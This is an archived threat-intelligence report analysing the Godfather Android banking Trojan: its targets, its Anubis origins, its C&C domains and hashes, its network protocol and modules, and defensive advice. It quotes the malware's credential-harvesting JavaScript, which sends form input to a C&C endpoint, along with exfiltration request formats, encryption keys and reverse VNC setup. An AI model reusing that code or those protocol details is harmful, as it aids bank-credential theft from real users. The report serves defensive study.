{
    "id": "6bace874-c810-47d4-bcd7-173898eab2f6",
    "created_at": "2023-01-12T15:09:12.982387Z",
    "updated_at": "2025-03-27T02:16:25.847483Z",
    "deleted_at": null,
    "sha1_hash": "475d46b9e1e2a54c1370b6dbb26618e8ea9d29bd",
    "title": "2022-12-21 - Godfather- A banking Trojan that is impossible to refuse",
    "authors": "",
    "file_creation_date": "2022-12-29T00:39:44Z",
    "file_modification_date": "2022-12-29T00:39:44Z",
    "file_size": 2439632,
    "plain_text": "# A banking Trojan that is impossible to refuse\n\n**blog.group-ib.com/godfather-trojan**\n\n21.12.2022\n\nGodfather:\n\nA banking Trojan that is impossible to refuse\n\n\n-----\n\nArtem Grischenko\n\nJunior Malware Analyst\n\nThe Android banking Trojan Godfather is currently being utilized by cybercriminals to attack\nusers of popular financial services across the globe. Godfather is designed to allow threat\nactors to harvest login credentials for banking applications and other financial services, and\ndrain the accounts. To date, its victims include users of over 400 international targets,\nincluding banking applications, cryptocurrency wallets, and crypto exchanges.\n\nFew people realize that hiding under Godfather’s hood is an old banking Trojan called\nAnubis, whose functionality has become outdated due to Android updates and the efforts of\nmalware detection and prevention providers. In this blog post, Group-IB’s [Threat Intelligence](https://www.group-ib.com/products/threat-intelligence/)\nteam describes in detail who Godfather attacks, how it does it, and what this banking Trojan\ninherited from its predecessor.\nGroup-IB first detected Godfather, a mobile banking Trojan that steals the banking and\ncryptocurrency exchange credentials of users, in June 2021. Almost a year later, in March\n[2022, researchers at Threat Fabric were the first to mention the banking Trojan publicly. A](https://twitter.com/ThreatFabric/status/1505932079401480198))\nfew months later, in June, the Trojan stopped being circulated. One of the reasons, Group-IB\nanalysts believe, why Godfather was taken out of use was for developers to update the\nTrojan further. Sure enough, Godfather reappeared in September 2022, now with slightly\nmodified WebSocket functionality\n\n\n-----\n\n**Key Findings**\n\n1\n\nGroup-IB’s Threat Intelligence detected more than 400 international financial\ncompanies targeted by the Godfather Android banking Trojan between June 2021 and\nOctober 2022.\n\n2\n\nHalf of the targeted financial companies were banks. Cryptocurrency wallets and\nexchanges were also targeted.\n\n3\n\nGodfather’s targets include 49 US-based companies, 31 Turkish-based companies,\nand 30 Spanish-based companies. Financial services providers in Canada, France,\nGermany, UK, Italy, and Poland were also among the most affected.\n\n4\n\nGodfather’s predecessor is another banking Trojan named Anubis.\n\n5\n\nGodfather’s developers used Anubis source code as a basis and modernized it for\nnewer versions of Android, adding relevant features and removing others such as file\nencryption.\n\n6\n\nGodfather overlays web fakes on infected devices that appear when a user interacts\nwith a decoy notification or tries to open one of the legitimate applications targeted by\nGodfather.\n\n7\n\nAny data, such as usernames and passwords, entered on the web fakes are harvested\nby the threat actors. Godfather can also exfiltrate SMS and push notifications to bypass\ntwo-factor authentication.\n\n8\n\nAccording to Telegram channels analyzed by Group-IB, Godfather is being distributed\nvia the Malware-as-a-Service model.\n\n\n-----\n\n9\n\nBased on Godfather's network infrastructure, this banking Trojan is distributed through\ndecoy applications hosted on Google Play.\n\nGodfather’s international targets\n\nTo date, 215 international banks, 94 cryptocurrency wallets and 110 crypto exchange\nplatforms have fallen victim to Godfather, as of October 2022. Most of the targeted\ncompanies are located in the United States, Turkey, Spain, Canada, Germany, France, and\nthe UK. Interestingly, Godfather spares users in post-Soviet countries. If the potential victim’s\nsystem preferences include one of the languages in that region, the Trojan shuts down. This\ncould suggest that Godfather’s developers are Russian speakers.\n\n_Figure 1: Who and where Godfather targets_\n\nA signature technique found in the functionality of any Android banking Trojan is the use of\nweb fakes (HTML pages created by the threat actors that are shown over legitimate\napplications), and Godfather has these in abundance. The fake pages that Godfather can\noverlay on infected devices appear after users click on decoy notifications or open legitimate\napps targeted by Godfather. All data entered into the fake web pages (such as usernames\nand passwords) is exfiltrated to command-and-control (C&C) servers. Group-IB researchers\nwere able to analyze some of the web fakes affecting Turkish banks, likely produced by a\nthreat actor explicitly targeting Turkish companies, and these are provided below.\n\nGodfather’s functionalities also include:\n\n\n-----\n\nRecording the screen of the victim s device\nEstablishing VNC connections\nLaunching keyloggers\nExfiltrating push notifications (for bypassing two-factor authentication); preceding\nversions of the Trojan also exfiltrated SMS messages\nForwarding calls (for bypassing two-factor authentication)\nExecuting USSD requests\nSending SMS messages from infected devices\nLaunching proxy servers\nEstablishing WebSocket connections (added to the new, September 2022 version of\nGodfather)\n\n**Gone but not forgotten: Anubis, we recognize you**\n\nThe basis of Godfather is a version of the banking Trojan called Anubis, whose source code\nwas [leaked as early as 2019. As new versions of Android were released, and malware](https://www.threatfabric.com/blogs/anubis_2_malware_and_afterlife.html)\ndetection and prevention providers got up to speed, many Anubis features stopped working\nand were thrown into the dustbin of history. But why create a new Trojan if one has been\ndeveloped already?\n\nThe developers of Godfather used Anubis source code as a basis and modernized it for\nnewer versions of Android, adding relevant features and removing others such as file\nencryption.\n\n\n-----\n\nWe found that both Trojans, Anubis and Godfather, have the same code base, but the C&C\ncommunication protocol and capabilities, together with their implementation, were modified in\nGodfather. The latter can therefore be considered an Anubis fork.\nComparison of Godfather and Anubis\n\nGiven that the source code for Anubis is publicly available, it is not possible to claim that the\ntwo Trojans were created by the same developer or operated by the same threat group.\n\nA distinctive feature of Godfather is that its command-and-control (C&C) servers are\nmentioned in Telegram channel descriptions (this technique for obtaining C&C addresses\n[from Telegram channels has been used before for some versions of Anubis). With the](https://www.trendmicro.com/en_us/research/19/a/google-play-apps-drop-anubis-banking-malware-use-motion-based-evasion-tactics.html)\nassistance of the new real-time Telegram monitoring functionalities of Group-IB’s Threat\nIntelligence, our researchers received information relating to one Telegram channel\ncontaining messages indicating that Godfather can be distributed using the MaaS (Malwareas-a-Service) model. These messages may be intended for operators of this Trojan. For\nexample, the author of the message in the figure below is asking for a review about the\nservice.\n\n_Figure 3: A Telegram user asking for a review of the Godfather banking trojan_\n\nGroup-IB analysts believe that Godfather can be distributed in a similar manner as Anubis\nwas. Anubis operators often distributed their payloads via malicious downloader applications\nhosted on Google Play. Like in some cases with Anubis, the Godfather payload imitates\nGoogle Protect. An example of the Anubis infection chain is shown in the article linked below.\n\nLearn more\n\nAn analysis of the Trojan’s network infrastructure revealed a domain that contains the C&C\naddress of an Android application. We could not obtain the payload, but we believe that this\n\n\n-----\n\ndownloader installs Godfather on infected devices. Below is a screenshot of Group-IB s\nGraph Network Analysis tool, a feature of Group-IB’s intelligence-driven Unified Risk\nPlatform, that shows links between the C&C addresses of Godfather and the downloaded\napplication.\n\n_Figure 4: Godfather’s network infrastructure, as detailed by Group-IB’s Graph Network_\n_Analysis tool_\n\nGodfather C&C addresses:\n\nhenkormerise[.]com\nbanerrokutepera[.]com\nheikenmorgan[.]com\n\nThe domain pluscurrencyconverter[.]com is the С&C address of the downloader application.\nBelow is a diagram showing replicated DNS A records for Godfather С&C addresses.\n\n\n-----\n\n_Figure 5: Replicated DNS A records for Godfather's C&C addresses_\n\nBelow is a screenshot of the hosted application on Google Play.\n\n\n-----\n\n_Figure 6: Screenshot of malicious application linked to Godfather distribution in Google Play_\n_Store (Source:_ _[@0xabc0)](https://twitter.com/0xabc0/status/1541758420424048640)_\n\nBased on the correlation above, we believe that one of the ways that Godfather is distributed\nis via decoy applications hosted on Google Play.\n\nIn this blog post, we focus on providing a detailed analysis of two versions of Godfather:\n\n_MD5: d7118d3d6bf476d046305be1e1f9b388_\n\n_SHA1: 2b3b78d3a62952dd88fc4da4688928ec6013af71_\n\n_SHA256: c79857015dbf220111e7c5f47cf20a656741a9380cc0faecd486b517648eb199_\n\n_VT Submission: 2022-03-22_\n\n_MD5: 7e061e87f9a4c27bfb69980980270720_\n\n_SHA1: 34d37927b35f422e7c28055ea989ef6524a668ef_\n\n_SHA256: b6249fa996cb4046bdab37bab5e3b4d43c79ea537f119040c3b3e138149897fd_\n\n_VT Submission: 2022-09-11_\n\n\n-----\n\nGodfather s responsibilities\n\n[The analyzed Godfather samples, one of which was uploaded to VirusTotal in September](https://blog.virustotal.com/)\n[2022, emulate Google Protect. After a user launches the malware, it emulates the legitimate](https://developers.google.com/android/play-protect)\nGoogle application. An animation shows Google Protect “activity”, but the “scanner” does not\nactually do anything and instead Godfather’s criminal roots become apparent. After being\nlaunched, the malware achieves persistence on the infected device, creates a pinned\nnotification, and hides its icon from the list of installed applications.\n\n\n-----\n\n_Figure 7: Google Protect animation_\n\nInitialization also involves launching a service for requesting access to AccessibilityService,\nwhich is an Android feature used by developers to adapt their applications to users with\ndisabilities. Recently, AccessibilityService has been actively used to carry out ATS\n(Automated Transfer System) attacks. Access to AccessibilityService is also requested when\nthe “Scan” button is pressed. It is worth noting that users cannot launch the “scanning”\nfunction without granting the Trojan access to AccessibilityService.\n\nOf course, no scanning takes place. The scanning animation is displayed for 30 seconds,\nafter which a message appears saying that no malicious applications were found.\n\nWith access to AccessibilityService, Godfather issues itself the necessary permissions and\nstarts communicating with the C&C server.\n\nThe user assumes that there are no Trojans on the device and launches their banking\napplication, entering their login details and not realizing that their data just got into the hands\nof threat actors.\n\nThe user eventually discovers that the money from their account is gone. They might try\nwithdrawing the permissions or deleting the application, but the settings will keep collapsing\nand the device will keep returning to the home screen.\n\nHow has the mafia boss managed to pull off such a heist? Let’s look into this.\n**Technical findings**\n\n\n-----\n\nWhen launched for the first time, Godfather does the following:\n\nChecks system language and context\nInitializes SharedPreferences parameters\nLaunches a service to request access to AccessibilityService\nLaunches a service to communicate with the C&C server\nHides its icon in the menu\n\nLet’s now look at some of the points above in more detail.\nChecking system language and context\n\nGodfather checks the system language, and the Trojan shuts down if the language is one of\nthe following:\n\nRU (Russia)\nAZ (Azerbaijan)\nAM (Armenia)\nBY (Belarus)\nKZ (Kazakhstan)\nKG (Kyrgyzstan)\nMD (Moldova)\nUZ (Uzbekistan)\nTJ (Tajikistan)\n\nIt also checks for the device context in order to determine whether the Trojan was launched\nin an emulator. If so, Godfather stops functioning.\nInitialization of SharedPreferences parameters\n\n[Godfather uses SharedPreferences to store necessary settings such as the C&C server, the](https://developer.android.com/reference/android/content/SharedPreferences)\nstatus of required permissions, the list of targets, and log data. The configuration file is called\nconfig.xml. Parameters for storing VNC settings (settings_port, settings_password) are\nsaved to the default settings file. This stage also involves generating a unique identifier (the\nrelevant field in the traffic is called key) which is used for identifying infected devices — this\nis essentially a bot ID. The generation algorithm involves choosing 15 random characters\nfrom the Latin alphabet and numbers from 0 to 9:\nABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890.\nA service for requesting access to AccessibilityService\n\nThe service checks whether the malware has been granted access to AccessibilityService. If\nit has not, the service requests access and creates a pop-up notification with the following\ntext: “Enable accessibility for protection to take effect ‘Google Protect”. This will happen\n\n\n-----\n\nevery eight seconds until the user grants the malicious application access to\nAccessibilityService.\n\nIn addition to being launched upon initialization, the service is launched when the victim\ndevice is restarted, turned on, or unlocked. You can find more information about what access\nto AccessibilityService is used for in the “AccessibilityService” section of this article.\nA service for communicating with the C&C server\n\nThis service creates a task that is executed every 70 seconds. The service is launched when\nthe device is turned on, restarted, or unlocked. Before obtaining the C&C server and\ncommunicating with it, the Trojan checks for the necessary permissions (writing to external\nstorage, reading contacts, reading the device status, and making calls). If the Trojan does\nnot have these permissions, it does the following:\n\nRequests the necessary permissions\nExfiltrates contacts\nExfiltrates the list of installed applications\n\nIn addition, the Trojan checks for administrator privileges. If they are not present, the\nmalware requests them.\nNext, the Trojan communicates with the C&C server to receive\ncommands and turn on its modules. Network requests, as well as commands that can be\nexecuted as a result of these requests, are described in the “Network communication”\nsection of this article.\nNetwork communication\n\n_Figure 8: Communication between Godfather and C&C addresses_\n\n\n-----\n\nThe figure above shows Godfather s communication with a C&C address, which can be\nbroken down into three parts:\n\n1. Receiving an up-to-date C&C address\n2. Receiving general commands (RatCommandRequest)\n3. Receiving commands for launching malware modules (InjectCommandRequest)\n\nIt is worth noting that RatCommandRequest and InjectCommandRequest commands are\nrequested simultaneously.\nGodfather does not have an up-to-date list of C&C addresses.\nInstead, it receives them from Telegram channel descriptions by executing an HTTP request\n(the GetC2Request in the figure above). An example of a Telegram channel with an\nencrypted C&C address is shown below. The up-to-date C&C address is encrypted using\nBlowfish (ECB mode), where the key is the string ABC. The same algorithm is used to\ndecrypt received commands, which the application requests from the C&C server\nimmediately after receiving the C&C address. As mentioned earlier in the article, there are\ntwo modules for receiving commands: regular commands and commands for enabling and\ndisabling the Trojan modules (RatCommandRequest and InjectCommandRequest in the\nfigure above).\n\n\n-----\n\n_Figure 9: Example of Telegram channel with encrypted C&C address_\n\nRatCommandRequest\n\nThis request is used for receiving commands and a list of victim applications. Request\nparameters contain the following information about the device:\n\nName of the network operator\nPhone status (locked or unlocked)\nWhether AccessibilityService permissions have been granted\nWhether the Trojan’s service for handling SMS messages has been installed\nWhether the necessary permissions have been granted (writing to external storage,\nreading contacts, reading the device status, and making calls)\nThe default user-agent for the device\nWhether the device is being charged (the new version does not have this feature)\nThe country code of the current network operator\nBot ID (the key parameter)\nWhether the screen is currently being recorded\nList of installed applications\n\n\n-----\n\nAndroid version\nDevice model\n\nExample of a request body:\n```\n{country=us, new=true, ver=8.1.0, accessibility=true, ag=Mozilla/5.0 (Linux; Android\n8.1.0; Google Pixel 2 Build/OPM6.171019.030.E1; wv) AppleWebKit/537.36 (KHTML, like\nGecko) Version/4.0 Chrome/74.0.3729.186 Mobile Safari/537.36,\napplist=com.rigbak.adnam2|||, startnow=0, replay=true, eyes=1, logd=new, sim=\n(Android, app_perm_check=false, batterycharging=xx, sms_value=0, model=Google Pixel 2\n(vbox86p)(i686), tag=PTS, perm_all=0, key=XQFGCGFTWXMH6PC}\n\n```\nThe server response is in the following format:\n\n%СOMMAND%|%PARAM1%|%PARAM2%|%PARAM3%|%PARAM4%\n\nThe table below shows commands that can be sent to the bot from the C&C server:\n\nInjectCommandRequest\n\nAs mentioned earlier in the article, this request is used for enabling/disabling various\nmodules of the Trojan. The actions that can be performed as a result of this request are:\n\nEnable a keylogger\nLaunch a VNC server\nRecord the screen\nLock the screen\nExfiltrate and block notifications\nEnable silent mode\nEstablish a WebSocket connection\nDim the screen\n\nThis request does not send any information about the infected device to the server. Below is\nan example of request parameters.\n```\n{inject_check=true, key=XQFGCGFTWXMH6PC}\n\n```\nThe server’s response is in the following format: {0}:{1}:{2}:{3}:{4}:{5}:{6}:{7}:{8}:{9}:{10}:{11}:\n{12}:{13}:{14}:{15}:{16} (Example:\n\"Injection::false::close:close:open:close:close:close:close:close:close:none::close:close\").\nThe {*} values are parameters that are processed. The table below describes each\nparameter.\n\nThe URI for requests is contained within the Trojan. Some of the requests found during file\nanalysis include:\n\n\n-----\n\n/aks.php\n/ads.php\n/forwadingx.php\n\n**Data exfiltration**\n\nWhile the Trojan is operational, data that threat actors are interested in is exfiltrated to the\nC&C server. This is done using requests with the following parameters:\n\nkey (bot ID)\nmessage (collected data in an encrypted form)\nnumber (\"true\")\npage (type of exfiltrated data)\n\nExample of a request:\n```\n{number=true, page=1,\nmessage=f8d2382f72890b1975e1f149d07fdd3c36fff1d523e4ea83b2b1f593f956e7a0,\nkey=D5GL78W1ESCYN7P}\n\n```\nThe field message contains information in encrypted form. The encryption algorithm is AES\n(CBC mode), where the key is 0123456789abcdef and the initialization vector is\nfedcba9876543210. The field page indicates the type of exfiltrated data and has one of the\nfollowing values: 1, 2, 4, 5. The table below describes exfiltrated data according to the page\ntype.\n\npage\n\nmessage\n\n1\n\nThe field contains one of the following:\n\nContacts list\nOne-time Google Authenticator passwords (com.google.android.apps.authenticator2)\nInformation about starting/stopping call forwarding\nInformation about starting/stopping a proxy\nInformation about received notifications (if the notification exfiltration option is enabled)\n\n2\n\nInformation about events tracked by the keylogger:\n\nTYPE_VIEW_CLICKED\nTYPE_VIEW_FOCUSED\n\n\n-----\n\nTYPE_VIEW_TEXT_CHANGED\nTYPE_WINDOW_STATE_CHANGED\n\nThis request is executed if the size of the collected information exceeds 12,000 bytes.\n\n4\n\nInformation about received SMS messages (the new, September 2022 version does not\nhave this feature).\n\n5\n\nContents of fields used for entering PINs or passwords.\n\n**AccessibilityService**\n\nAn important detail about Godfather is that it will not work if it is not granted access to\nAccessibilityService. The Trojan’s event handler has the following functionalities:\n\nLimiting the user’s ability to remove the Trojan from the system (if the user opens\napplication settings or edits the list of applications that have administrator privileges,\nthese windows will be closed)\nProviding the necessary permissions, such as SMS and notification processing, screen\nrecording, and administrator privileges\nExfiltrating Google Authenticator one-time passwords (OTPs)\n(com.google.android.apps.authenticator2) [similar to Cerberus](https://www.threatfabric.com/blogs/2020_year_of_the_rat.html)\nExfiltrating the contents of fields used for entering PINs or passwords\nIf an app included in the list of target applications is launched, the app’s screen will be\nrecorded (if the option for turning the screen recording module on has been received)\nor a web fake will be shown (if the app is in the list of applications received from the\nserver to download the web fake)\nProcessing commands: cachecleaner, killbot\nExfiltrating the results of USSD requests if the command startUSSD was received\n\nAccessibilityService includes handling the keylogger functionality. Below are templates for\nspecific event types:\n\nIf the event TYPE_NOTIFICATION_STATE_CHANGED is triggered and the notification\nexfiltration option is enabled, the contents of the notification will be sent to the C&C server.\n\n**Proxy module**\n\n\n-----\n\nOn infected devices, Godfather can launch a backconnect proxy server, for which port 34500\nis used (located in the body of the Trojan). The Trojan opens and configures this port for\nhandling the SOCKS5 protocol. Parameters (host, user, pass, port) necessary for\nimplementing a proxy are received together with a command for launching a proxy\n(startsocks5).\n\n**VNC module**\n\nGodfather implements VNC functionality using two native libraries, which are stored in the\nTrojan’s resources in encrypted form. The encryption algorithm is AES (ECB mode), where\nthe key is the string GWy8tfjp4mXpu58fCRpWCLxqHV8YmeHR. The libraries are stored in\nthe Trojan’s resources with the following naming convention:\nlib.%ARCHITECTURE%.godfat.so, lib.%ARCHITECTURE%.vncserver.so. It is worth noting\nthat in the new version of the Trojan these libraries are stored in unencrypted form and have\nthe following names: libspotify.so, libjson.so.\n\nlib.%ARCHITECTURE%.vncserver.so is an open-source library used for implementing VNC\n[connections. The code of this library is available at GitHub.](https://github.com/LibVNC/libvncserver)\n\nThe library lib.%ARCHITECTURE%.godfat.so is a JNI (Java Native Interface) wrapper that is\nrequired for the abovementioned Unix library to function correctly.\n\nTransferring control via VNC occurs in two stages:\n\n1. The C&C server sends a command to start the VNC module.\n2. The C&C server sends an address to which the infected device will connect and\n\ntransfer VNC control (establish a reverse VNC connection)\n\nWhen the command to launch a VNC server is received, no parameters from the server are\nprocessed. Below are static parameters that are used when the server is launched:\n\nport: the value of the SharedPreferences settings_port parameter (by default the value\nis 5900)\nuser: the value of the system settings bluetooth_name parameter\npass: the value of the SharedPreferences settings_password parameter (by default the\nvalue is 123).\n\nWhen the command for establishing a reverse VNC connection is processed, the “host”\nparameter to which the reverse connection will be established is transferred. The port for the\nconnection is contained in the Trojan and has the value 5500 (the default port for the reverse\nVNC connection).\n\nThe figure below shows the process of connecting to a remote VNC client.\n\n\n-----\n\n_Figure 10: How Godfather connects to remote VNC clients_\n\n**ScreenCapture module**\n\nThis module is used for recording the screen of an infected device and then exfiltrating the\nrecording to the C&C server. The module makes it possible to steal data entered by the user\nin legitimate applications as well as any information contained in an application that\nGodfather targets. This module is launched in one of two cases:\n\nA relevant command has been received from the server\nAn application from the target list has been launched (the malware should receive this\nlist in advance)\n\nIt is worth mentioning that some of the package names from the list were intentionally altered\n(the character 1 was added to the package names) to prevent the module from being\nlaunched. It is possible that the threat actors have not yet decided what they will do with the\ndata they receive or they simply lost interest in these applications during the testing stage.\nThe screen is recorded using standard Android classes:\n\nandroid.media.projection.MediaProjectionManager\nandroid.media.projection.MediaProjection\n\nThe screen recording is saved to a file whose path is created according to the following\ntemplate:\n\n%DEFAULT_DIRECTORY_MOVIES%/%KEY%_%CURRENT_TIME_MS%.mp4\n\n\n-----\n\nThe screen is recorded for two minutes. The resulting file is sent to the C&C server. The URL\nfor sending the file is created according to the following template:\n\n%DECRYPTED_C2%/mp4_recorder.php\nBelow is the format of the request body:\n```\n--*****\\r\\nContent-Disposition: form-data;\nname=\\\"myfile\\\";filename=\\\"%FILENAME%\\\"\\r\\n\\r\\n%FILE_CONTENT%\\r\\n--*****--\\r\\n\n\n```\nFor the screen recording to be initialized, the relevant options received from the C&C server\nmust be enabled and the relevant permissions must be obtained.\n\n**WebSocket module**\n\nThis module was added to the updated September 2022 version of the banking Trojan. The\nmodule makes it possible to use a persistent WebSocket connection to control an infected\ndevice. At the moment, Godfather processes three types of messages from the server:\n\nPerform the action “Back”\nExecute clicks\nEnter text into fields\n\nThe address of the server to which the connection will be established must first be received\nfrom the C&C server as an option in the request InjectCommandRequest.\n\n**Web-fake module**\n\nLike Anubis, Godfather has a module for downloading and displaying web fakes. The method\nof exfiltrating data from a web fake to the C&C server in Godfather is the same as in Anubis.\n\nWeb fakes can be downloaded in two cases: if the user has followed the decoy push\nnotification or if an application in the target list has been opened.\n\nIn the case of a fake push notification, a notification icon will be downloaded in addition to the\nweb fake. The icon is located at a URL in the following format:\n\n%DECRYPTED_C2%/icon/%PACKAGE_NAME%.png\n\n%PACKAGE_NAME% is the package name for the application that the fake push notification\nmimics. The URL for downloading web fakes is formed according to the following template:\n\n%DECRYPTED_C2%/itor/fafa.php?f=%PACKAGE_NAME%&p=%KEY%|%LOCALE%\n\n%KEY% is the key sent as a parameter in the requests mentioned above. %LOCALE% is\nthe system language. The user-agent used when the request is executed is:\n\n\n-----\n\nMozilla/5.0 (Linux; Android 9; SM-J730F Build/PPR12.180610.011; wv) AppleWebKit/537.36\n(KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36\n```\nfunction submit_data(form) {\n\n      var json = {};\n\n      for( var i = 0 ; i < form.length ; i++ )\n\n      {\n\n        var input = form[i];\n\n        if ( input.type == \"submit\" )\n\n          continue;\n\n        json[ form[i].name ] = form[i].value;\n\n      }\n\n  logs = \"\"\n\n  $.each(json, function(i, v) {\n\n    logs = logs + \"\" + i + \":\" + v + \"//br//\";\n\n  });\n\n  top['closeDlg'] = true;\n\n  var url = '%C2%';\n\n  var imei_c = '%KEY%|%LOCALE%';\n\n  location.replace(url + '/sender_new.php?p=' + imei_c +\n\"|Injection_10|%PACKAGE_NAME%|\" + logs+'|918')\n\n}\n\n```\nThe HTML pages obtained as part of our analysis contain a JS script (the example is shown\nabove), which is used for processing an authorization form. When an authorization attempt is\nmade, a request to the C&C server is executed. The request URL is formed according to the\nfollowing template:\n\n%DECRYPTED_C2%/sender_new.php?\np=%KEY%|%LOCALE%|Injection_10|%PACKAGE_NAME%|%FORMATTED_DATA%\n\n%FORMATTED_DATA% is a string formed according to the following template:\n\n%FIELD_NAME%:%FIELD_VALUE%//br//%FIELD_NAME%:%FIELD_VALUE%//br//\n**Conclusion**\n\nSometimes the sequel really can be better than the original. The case of Godfather highlights\nhow quickly Trojan developers can adapt their tools and stay one step ahead of their Android\ncounterparts. Additionally, it shows how easily available source code, such as that of Anubis,\ncan be modernized and relaunched, especially under the Malware-as-a-Service model.\n\nThe lack of direct communication between the threat actor and victim also makes Godfather\nan effective malware type. Of course, Godfather shuts down on an infected device if it\ndetects that the user is from Russia or a CIS country, but this model allows the malware to be\n\n\n-----\n\nspread across the world, given that all that is required is the creation of a web fake\nimpersonating a bank or an e-wallet provider in a particular country.\n\nBy imitating Google Protect, Godfather can easily go undetected on infected devices.\nUnwitting users believe they are being protected by an Android service, but in fact, the\nmalicious actors gain access to their banking and financial portal accounts. While Group-IB\ndoes not have definitive data on the amount of money stolen by operators of Godfather, the\nmethods harnessed by malicious actors are cause for concern.\n**Recommendations on how to protect against Godfather**\n\nThe security of mobile applications and operating systems is improving rapidly. However, it is\ntoo early to write Android banking Trojans off completely. In our experience, banking Trojans\nare still highly active and threat actors widely distribute modified Trojans whose source code\nis publicly available. A good example of this trend is Godfather, which is damaging to not\nonly end users of banking applications but also the entire banking sector itself.\n\n**For users**\n\nBelow are some basic recommendations on how to protect mobile devices from banking\nTrojans like Godfather.\n\nAlways check for updates on your mobile device. The more recent the version of\nAndroid, the less vulnerable the device is to such threats.\n\nDo not download applications from sources other than Google Play (however, even\nGoogle Play cannot guarantee total security). Check what permissions an application\nrequests before installing it.\n\nAlways check what permissions an application requests (in the case of Godfather,\ncommunication between the Trojan and the server only takes place after access to\nAccessibilityService has been granted).\n\nDo not visit third-party and suspicious resources.\n\nDo not follow links in SMS messages.\n\nIf your device has been infected, do the following:\n\n1. Disable network access.\n2. Freeze any bank accounts that may have been accessed from your device.\n\n\n-----\n\n3. Contact experts to receive detailed information about the risks that the malware could\n\npose to your device.\n\n**For organizations**\n\nThe **[Group-IB Threat Intelligence team will continue to track Godfather and update our](https://www.group-ib.com/products/threat-intelligence/)**\ndatabase with new indicators related to this trojan. Additionally, our Threat Intelligence team\nwill notify customers in cases in which their application is targeted by Godfather, or any other\nAndroid malware that we track.\n\nFor organizations that wish to protect their customers, implementing a solution that monitors\n[user sessions such as Group-IB Fraud Protection will stop malware operators from](https://www.group-ib.com/products/fraud-protection/)\ndefrauding their clients and damaging their reputation.\n\nGroup-IB’s Fraud Protection detects the latest fraud techniques, phishing preparation, and\nother types of attacks. The platform integrates data from Group-IB's attribution-based Threat\nIntelligence system. Exclusive information about cybercriminals, malware, adversary IP\naddresses, and compromised data (logins, passwords, bank cards) helps develop anti-fraud\nsystems and cybersecurity teams, which allows the latter to identify intruders and their\nactions.\n\nIn this way, Fraud Protection \"catches\" banking Trojans, detects unauthorized remote\naccess, web injections, cross-channel attacks, and personal data collection. Group-IB's\nsolution implements patented algorithms that help detect infected devices without the client's\ninvolvement and without the need to install additional software.\n\nTry Group-IB Threat Intelligence now!\n\nOptimize strategic, operational and tactical decision-making with best-in-class cyber threat\nanalytics.\n\nRequest Threat Intelligence Demo Right Now\n\nIf you found this article helpful, share it with your friends!\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-12-21 - Godfather- A banking Trojan that is impossible to refuse.pdf"
    ],
    "report_names": [
        "2022-12-21 - Godfather- A banking Trojan that is impossible to refuse.pdf"
    ],
    "threat_actors": [
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673536152,
    "ts_updated_at": 1743041785,
    "ts_creation_date": 1672274384,
    "ts_modification_date": 1672274384,
    "files": {
        "pdf": "https://archive.orkl.eu/475d46b9e1e2a54c1370b6dbb26618e8ea9d29bd.pdf",
        "text": "https://archive.orkl.eu/475d46b9e1e2a54c1370b6dbb26618e8ea9d29bd.txt",
        "img": "https://archive.orkl.eu/475d46b9e1e2a54c1370b6dbb26618e8ea9d29bd.jpg"
    }
}